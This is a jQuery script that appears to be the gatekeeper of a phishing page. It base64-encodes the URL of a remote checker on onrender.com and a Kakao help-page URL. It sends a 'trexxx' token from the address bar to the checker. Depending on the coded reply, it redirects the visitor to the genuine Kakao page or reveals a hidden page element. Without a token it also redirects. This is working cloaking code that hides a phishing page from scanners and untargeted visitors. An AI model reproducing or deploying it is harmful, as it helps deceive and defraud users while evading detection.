$(document).ready(function() {
const urlParams = new URLSearchParams(window.location.href);
var trex = urlParams.get("trexxx");
var fr = window.atob("aHR0cHM6Ly9jaGVjazRydWduZWprZGRmLm9ucmVuZGVyLmNvbS8=");
var link1 = window.atob("aHR0cHM6Ly9jcy5rYWthby5jb20vaGVscHM/c2VydmljZT01MiZjYXRlZ29yeT0xODAmbG9jYWxlPWtv");
var randomLink = Math.random().toString(13).replace('0.', '');
var formData = {trex: trex,};
newPageTitle = 'Does not Exist!';
if (trex) {	
			$.ajax({
				url: fr,
				type: 'POST',
				data: formData,
				success: function(response){
						var text = response;
						if(response === "100110010011001") {console.log(randomLink); document.title = newPageTitle; window.location.replace(link1);} else if (response === "10011001001100111") {document.getElementById("trexpage").style.display = "block";}
				}
			});
				
			} else {window.location.replace(link1);}
});